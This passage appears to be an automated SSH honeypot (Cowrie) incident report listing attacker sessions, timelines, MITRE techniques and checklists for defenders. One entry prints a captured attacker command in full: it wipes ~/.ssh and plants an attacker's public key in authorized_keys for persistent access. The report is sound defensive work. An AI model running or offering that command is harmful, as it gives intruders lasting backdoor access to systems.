| `2026-07-09 07:23:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1c89310fa5a

| Field | Detail |
|---|---|
| **Source IP** | `111.26.184[.]29` |
| **First Seen** | 2026-07-09 07:29 |
| **Last Seen** | 2026-07-09 07:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:29:19` | `cowrie.session.connect` |
| `2026-07-09 07:29:20` | `cowrie.client.version` |
| `2026-07-09 07:29:20` | `cowrie.client.kex` |
| `2026-07-09 07:29:22` | `cowrie.login.success` |
| `2026-07-09 07:29:23` | `cowrie.direct-tcpip.request` |
| `2026-07-09 07:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.26.184[.]29` to AbuseIPDB if not already reported
- [ ] Block `111.26.184[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c00bbbf43f0a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 07:31 |
| **Last Seen** | 2026-07-09 07:31 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:31:32` | `cowrie.session.connect` |
| `2026-07-09 07:31:33` | `cowrie.client.version` |
| `2026-07-09 07:31:33` | `cowrie.client.kex` |
| `2026-07-09 07:31:39` | `cowrie.login.success` |
| `2026-07-09 07:31:41` | `cowrie.session.params` |
| `2026-07-09 07:31:41` | `cowrie.command.input` |
| `2026-07-09 07:31:43` | `cowrie.log.closed` |
| `2026-07-09 07:31:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa7b8d37aa91

| Field | Detail |
|---|---|
| **Source IP** | `211.22.222[.]251` |
| **First Seen** | 2026-07-09 07:39 |
| **Last Seen** | 2026-07-09 07:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:39:21` | `cowrie.session.connect` |
| `2026-07-09 07:39:22` | `cowrie.client.version` |
| `2026-07-09 07:39:22` | `cowrie.client.kex` |
| `2026-07-09 07:39:24` | `cowrie.login.success` |
| `2026-07-09 07:39:25` | `cowrie.direct-tcpip.request` |
| `2026-07-09 07:39:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.22.222[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.22.222[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-273c2e577c4c

| Field | Detail |
|---|---|
| **Source IP** | `68.225.58[.]59` |
| **First Seen** | 2026-07-09 07:39 |
| **Last Seen** | 2026-07-09 07:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:39:37` | `cowrie.session.connect` |
| `2026-07-09 07:39:38` | `cowrie.client.version` |
| `2026-07-09 07:39:38` | `cowrie.client.kex` |
| `2026-07-09 07:39:40` | `cowrie.login.success` |
| `2026-07-09 07:39:41` | `cowrie.direct-tcpip.request` |
| `2026-07-09 07:39:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.225.58[.]59` to AbuseIPDB if not already reported
- [ ] Block `68.225.58[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9dea7ae7259

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 07:43 |
| **Last Seen** | 2026-07-09 07:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:43:29` | `cowrie.session.connect` |
| `2026-07-09 07:43:29` | `cowrie.client.version` |
| `2026-07-09 07:43:29` | `cowrie.client.kex` |
| `2026-07-09 07:43:29` | `cowrie.login.success` |
| `2026-07-09 07:43:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb1e15cd52fb

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 07:43 |
| **Last Seen** | 2026-07-09 07:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:43:29` | `cowrie.session.connect` |
| `2026-07-09 07:43:29` | `cowrie.client.version` |
| `2026-07-09 07:43:29` | `cowrie.client.kex` |
| `2026-07-09 07:43:29` | `cowrie.login.success` |
| `2026-07-09 07:43:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-915f323da6f4

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 07:43 |
| **Last Seen** | 2026-07-09 07:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:43:36` | `cowrie.session.connect` |
| `2026-07-09 07:43:36` | `cowrie.client.version` |
| `2026-07-09 07:43:36` | `cowrie.client.kex` |
| `2026-07-09 07:43:36` | `cowrie.login.success` |
| `2026-07-09 07:43:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4021c94a34e3

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-09 07:43 |
| **Last Seen** | 2026-07-09 07:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:43:36` | `cowrie.session.connect` |
| `2026-07-09 07:43:36` | `cowrie.client.version` |
| `2026-07-09 07:43:36` | `cowrie.client.kex` |
| `2026-07-09 07:43:36` | `cowrie.login.success` |
| `2026-07-09 07:43:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdbdb97d3a5a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 07:44 |
| **Last Seen** | 2026-07-09 07:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:44:39` | `cowrie.session.connect` |
| `2026-07-09 07:44:39` | `cowrie.client.version` |
| `2026-07-09 07:44:39` | `cowrie.client.kex` |
| `2026-07-09 07:44:40` | `cowrie.login.success` |
| `2026-07-09 07:44:41` | `cowrie.session.params` |
| `2026-07-09 07:44:41` | `cowrie.command.input` |
| `2026-07-09 07:44:41` | `cowrie.log.closed` |
| `2026-07-09 07:44:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d6132052463

| Field | Detail |
|---|---|
| **Source IP** | `117.241.77[.]78` |
| **First Seen** | 2026-07-09 07:46 |
| **Last Seen** | 2026-07-09 07:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:46:20` | `cowrie.session.connect` |
| `2026-07-09 07:46:21` | `cowrie.client.version` |
| `2026-07-09 07:46:21` | `cowrie.client.kex` |
| `2026-07-09 07:46:23` | `cowrie.login.success` |
| `2026-07-09 07:46:24` | `cowrie.direct-tcpip.request` |
| `2026-07-09 07:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.241.77[.]78` to AbuseIPDB if not already reported
- [ ] Block `117.241.77[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8d8d650919e

| Field | Detail |
|---|---|
| **Source IP** | `103.250.160[.]76` |
| **First Seen** | 2026-07-09 07:46 |
| **Last Seen** | 2026-07-09 07:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:46:30` | `cowrie.session.connect` |
| `2026-07-09 07:46:30` | `cowrie.client.version` |
| `2026-07-09 07:46:30` | `cowrie.client.kex` |
| `2026-07-09 07:46:33` | `cowrie.login.success` |
| `2026-07-09 07:46:34` | `cowrie.direct-tcpip.request` |
| `2026-07-09 07:46:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.250.160[.]76` to AbuseIPDB if not already reported
- [ ] Block `103.250.160[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cc6cb40d3bd

| Field | Detail |
|---|---|
| **Source IP** | `121.189.198[.]60` |
| **First Seen** | 2026-07-09 07:49 |
| **Last Seen** | 2026-07-09 07:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:49:42` | `cowrie.session.connect` |
| `2026-07-09 07:49:43` | `cowrie.client.version` |
| `2026-07-09 07:49:43` | `cowrie.client.kex` |
| `2026-07-09 07:49:45` | `cowrie.login.success` |
| `2026-07-09 07:49:45` | `cowrie.direct-tcpip.request` |
| `2026-07-09 07:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.198[.]60` to AbuseIPDB if not already reported
- [ ] Block `121.189.198[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07d1bd854ebc

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]10` |
| **First Seen** | 2026-07-09 07:49 |
| **Last Seen** | 2026-07-09 07:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:49:55` | `cowrie.session.connect` |
| `2026-07-09 07:49:56` | `cowrie.client.version` |
| `2026-07-09 07:49:56` | `cowrie.client.kex` |
| `2026-07-09 07:49:58` | `cowrie.login.success` |
| `2026-07-09 07:49:59` | `cowrie.direct-tcpip.request` |
| `2026-07-09 07:50:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]10` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfe62a2ef5c0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 07:51 |
| **Last Seen** | 2026-07-09 07:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:51:59` | `cowrie.session.connect` |
| `2026-07-09 07:52:01` | `cowrie.client.version` |
| `2026-07-09 07:52:01` | `cowrie.client.kex` |
| `2026-07-09 07:52:06` | `cowrie.login.success` |
| `2026-07-09 07:52:10` | `cowrie.session.params` |
| `2026-07-09 07:52:10` | `cowrie.command.input` |
| `2026-07-09 07:52:11` | `cowrie.log.closed` |
| `2026-07-09 07:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-688d5e42184c

| Field | Detail |
|---|---|
| **Source IP** | `117.216.33[.]31` |
| **First Seen** | 2026-07-09 07:55 |
| **Last Seen** | 2026-07-09 07:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:55:09` | `cowrie.session.connect` |
| `2026-07-09 07:55:09` | `cowrie.client.version` |
| `2026-07-09 07:55:09` | `cowrie.client.kex` |
| `2026-07-09 07:55:12` | `cowrie.login.success` |
| `2026-07-09 07:55:13` | `cowrie.direct-tcpip.request` |
| `2026-07-09 07:55:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.216.33[.]31` to AbuseIPDB if not already reported
- [ ] Block `117.216.33[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-471191d691b5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 07:55 |
| **Last Seen** | 2026-07-09 07:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:55:15` | `cowrie.session.connect` |
| `2026-07-09 07:55:15` | `cowrie.client.version` |
| `2026-07-09 07:55:15` | `cowrie.client.kex` |
| `2026-07-09 07:55:16` | `cowrie.login.success` |
| `2026-07-09 07:55:16` | `cowrie.session.params` |
| `2026-07-09 07:55:16` | `cowrie.command.input` |
| `2026-07-09 07:55:17` | `cowrie.log.closed` |
| `2026-07-09 07:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b968ee421ef

| Field | Detail |
|---|---|
| **Source IP** | `62.106.95[.]68` |
| **First Seen** | 2026-07-09 07:55 |
| **Last Seen** | 2026-07-09 07:56 |
| **Session Duration** | 58s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:55:30` | `cowrie.session.connect` |
| `2026-07-09 07:55:30` | `cowrie.client.version` |
| `2026-07-09 07:55:30` | `cowrie.client.kex` |
| `2026-07-09 07:55:31` | `cowrie.login.success` |
| `2026-07-09 07:56:28` | `cowrie.session.file_upload` |
| `2026-07-09 07:56:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.106.95[.]68` to AbuseIPDB if not already reported
- [ ] Block `62.106.95[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1f832ed6b58

| Field | Detail |
|---|---|
| **Source IP** | `103.191.14[.]210` |
| **First Seen** | 2026-07-09 07:57 |
| **Last Seen** | 2026-07-09 07:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:57:26` | `cowrie.session.connect` |
| `2026-07-09 07:57:26` | `cowrie.client.version` |
| `2026-07-09 07:57:26` | `cowrie.client.kex` |
| `2026-07-09 07:57:27` | `cowrie.login.success` |
| `2026-07-09 07:57:28` | `cowrie.session.params` |
| `2026-07-09 07:57:28` | `cowrie.command.input` |
| `2026-07-09 07:57:28` | `cowrie.command.failed` |
| `2026-07-09 07:57:29` | `cowrie.log.closed` |
| `2026-07-09 07:57:29` | `cowrie.session.params` |
| `2026-07-09 07:57:29` | `cowrie.command.input` |
| `2026-07-09 07:57:30` | `cowrie.session.file_download` |
| `2026-07-09 07:57:30` | `cowrie.log.closed` |
| `2026-07-09 07:57:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.14[.]210` to AbuseIPDB if not already reported
- [ ] Block `103.191.14[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-798f4f840c2a

| Field | Detail |
|---|---|
| **Source IP** | `103.191.14[.]210` |
| **First Seen** | 2026-07-09 07:57 |
| **Last Seen** | 2026-07-09 07:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:57:30` | `cowrie.session.connect` |
| `2026-07-09 07:57:30` | `cowrie.client.version` |
| `2026-07-09 07:57:30` | `cowrie.client.kex` |
| `2026-07-09 07:57:31` | `cowrie.login.success` |
| `2026-07-09 07:57:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.14[.]210` to AbuseIPDB if not already reported
- [ ] Block `103.191.14[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bfc162196cc

| Field | Detail |
|---|---|
| **Source IP** | `103.191.14[.]210` |
| **First Seen** | 2026-07-09 07:57 |
| **Last Seen** | 2026-07-09 07:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:57:32` | `cowrie.session.connect` |
| `2026-07-09 07:57:32` | `cowrie.client.version` |
| `2026-07-09 07:57:32` | `cowrie.client.kex` |
| `2026-07-09 07:57:33` | `cowrie.login.success` |
| `2026-07-09 07:57:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.191.14[.]210` to AbuseIPDB if not already reported
- [ ] Block `103.191.14[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23f1db1d62d1

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 08:00 |
| **Last Seen** | 2026-07-09 08:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:00:51` | `cowrie.session.connect` |
| `2026-07-09 08:00:51` | `cowrie.client.version` |
| `2026-07-09 08:00:51` | `cowrie.client.kex` |
| `2026-07-09 08:00:51` | `cowrie.login.success` |
| `2026-07-09 08:00:51` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:00:52` | `cowrie.direct-tcpip.data` |
| `2026-07-09 08:00:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-819d80f4a126

| Field | Detail |
|---|---|
| **Source IP** | `213.230.65[.]53` |
| **First Seen** | 2026-07-09 08:00 |
| **Last Seen** | 2026-07-09 08:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:00:53` | `cowrie.session.connect` |
| `2026-07-09 08:00:54` | `cowrie.client.version` |
| `2026-07-09 08:00:54` | `cowrie.client.kex` |
| `2026-07-09 08:00:56` | `cowrie.login.success` |
| `2026-07-09 08:00:57` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.65[.]53` to AbuseIPDB if not already reported
- [ ] Block `213.230.65[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-164d549d622d

| Field | Detail |
|---|---|
| **Source IP** | `218.21.246[.]238` |
| **First Seen** | 2026-07-09 08:01 |
| **Last Seen** | 2026-07-09 08:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:01:03` | `cowrie.session.connect` |
| `2026-07-09 08:01:03` | `cowrie.client.version` |
| `2026-07-09 08:01:03` | `cowrie.client.kex` |
| `2026-07-09 08:01:06` | `cowrie.login.success` |
| `2026-07-09 08:01:07` | `cowrie.direct-tcpip.request` |
| `2026-07-09 08:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.246[.]238` to AbuseIPDB if not already reported
- [ ] Block `218.21.246[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-779686611cf3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 08:03 |
| **Last Seen** | 2026-07-09 08:03 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:03:13` | `cowrie.session.connect` |
| `2026-07-09 08:03:15` | `cowrie.client.version` |
| `2026-07-09 08:03:15` | `cowrie.client.kex` |
| `2026-07-09 08:03:20` | `cowrie.login.success` |
| `2026-07-09 08:03:24` | `cowrie.session.params` |
| `2026-07-09 08:03:24` | `cowrie.command.input` |
| `2026-07-09 08:03:25` | `cowrie.log.closed` |
| `2026-07-09 08:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b912edb10c9f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 08:05 |
| **Last Seen** | 2026-07-09 08:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 08:05:53` | `cowrie.session.connect` |
| `2026-07-09 08:05:53` | `cowrie.client.version` |
| `2026-07-09 08:05:53` | `cowrie.client.kex` |
| `2026-07-09 08:05:53` | `cowrie.login.success` |
| `2026-07-09 08:05:54` | `cowrie.session.params` |
| `2026-07-09 08:05:54` | `cowrie.command.input` |
| `2026-07-09 08:05:54` | `cowrie.log.closed` |
| `2026-07-09 08:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b36a1f5d2f2

| Field | Detail |
|---|---|
| **Source IP** | `121.229.9[.]110` |
| **First Seen** | 2026-07-09 08:08 |
| **Last Seen** | 2026-07-09 08:13 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
